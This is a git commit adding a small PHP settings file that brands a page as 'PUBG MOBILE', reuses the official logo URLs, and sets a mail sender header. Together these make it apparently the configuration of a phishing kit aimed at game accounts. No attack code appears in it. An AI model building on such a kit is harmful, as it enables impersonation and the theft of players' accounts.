0401aaec586167bcd20917dd218c98b3c8fd826d
Rahmat0231 <73234424+Rahmat0231@users.noreply.github.com>
2023-01-31 14:05:40 +0700

    Add files via upload

---
+++ system/setting.php
@@ -0,0 +1,15 @@
+<?php
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+$title = 'PUBG MOBILE: SESESELOW';
+$description = 'ACCOUNT MF AUTO MASUK: SUKSES AWKOWK!';
+$copyright = 'PUBG MOBILE';
+$theme = '#000';
+$image = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+
+$author = 'ITS ME @SE3LOW';
+$sender = 'From: NDAN PAHMI🦇 <panelcgs@gmail.com>';
+
+?>
